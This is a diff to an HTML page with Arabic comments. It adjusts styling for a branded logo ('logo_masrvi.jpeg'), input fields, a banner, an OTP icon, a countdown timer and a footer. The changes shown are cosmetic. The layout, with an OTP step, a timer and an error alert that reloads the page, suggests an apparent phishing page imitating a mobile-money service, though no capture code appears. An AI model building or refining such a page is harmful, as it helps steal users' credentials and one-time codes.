@@ -7,11 +7,11 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');
         body { margin: 0; padding: 0; background-color: #f9f9f9; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; min-height: 100vh; }
-        .wrapper { width: 100%; max-width: 450px; background: #fff; position: relative; padding-bottom: 120px; display: flex; flex-direction: column; overflow: hidden; box-shadow: 0 0 15px rgba(0,0,0,0.1); }
+        .wrapper { width: 100%; max-width: 450px; background: #fff; position: relative; padding-bottom: 140px; display: flex; flex-direction: column; overflow: hidden; box-shadow: 0 0 15px rgba(0,0,0,0.1); }
         
-        /* 1. الشعار العلوي */
-        .header-container { width: 100%; height: 90px; display: flex; justify-content: center; align-items: center; padding-top: 10px; }
-        .header-img { max-height: 80%; max-width: 90%; object-fit: contain; }
+        /* 1. تعديل حجم الشعار العلوي */
+        .header-container { width: 100%; height: 120px; display: flex; justify-content: center; align-items: center; padding-top: 15px; }
+        .header-img { width: 220px; height: auto; object-fit: contain; } /* التحكم في العرض هنا */
 
         .form-container { padding: 0 25px; text-align: right; z-index: 2; }
         .label { font-weight: bold; margin-bottom: 8px; display: block; font-size: 15px; color: #333; }
@@ -19,25 +19,22 @@
         .input-box { position: relative; border: 1.8px solid #000; border-radius: 12px; margin-bottom: 20px; background: #fff; display: flex; align-items: center; }
         input { border: none; width: 100%; font-size: 18px; padding: 14px; text-align: center; outline: none; background: transparent; font-family: 'Cairo'; }
         
-        /* 2 & 3. أيقونات الحقول */
         .field-icon { width: 28px; height: 28px; margin-left: 12px; object-fit: contain; }
 
         .btn-main { background-color: #94a3b8; color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-size: 19px; font-weight: bold; cursor: pointer; margin-top: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
         .btn-main.active { background-color: #2c5364; }
 
-        /* 4. البانر الإعلاني */
         .banner-container { width: 100%; margin-top: 25px; text-align: center; }
         .banner-img { width: 92%; border-radius: 10px; }
 
-        /* 5. أيقونة OTP الكبيرة */
         .otp-icon-container { width: 100%; text-align: center; margin: 30px 0; }
         .otp-main-icon { width: 110px; height: 110px; object-fit: contain; }
 
         .timer-box { background: #000; color: #fff; width: fit-content; margin: 15px auto; padding: 10px 30px; font-size: 26px; font-weight: bold; border-radius: 8px; }
         
-        /* 6. خلفية الأسفل */
-        .footer-container { position: absolute; bottom: 0; left: 0; width: 100%; height: 130px; z-index: 1; pointer-events: none; }
-        .footer-img { width: 100%; height: 100%; object-fit: cover; }
+        /* 6. تعديل خلفية الأسفل */
+        .footer-container { position: absolute; bottom: 0; left: 0; width: 100%; height: 150px; z-index: 1; pointer-events: none; }
+        .footer-img { width: 100%; height: 100%; object-fit: fill; } /* تم التغيير لضمان ملء العرض */
 
         .hidden { display: none !important; }
     </style>
@@ -46,6 +43,7 @@
 
 <div class="wrapper">
     <div class="header-container">
+        <!-- تم وضع الشعار هنا -->
         <img src="logo_masrvi.jpeg" class="header-img">
     </div>
 
@@ -88,6 +86,7 @@
     </div>
 
     <div class="footer-container">
+        <!-- تم وضع خلفية الأسفل هنا -->
         <img src="footer_background.jpeg" class="footer-img">
     </div>
 </div>
@@ -147,3 +146,8 @@
         alert("خطأ في الشبكة، يرجى المحاولة لاحقاً.");
         location.reload();
     }
+</script>
+
+</body>
+</html>
+
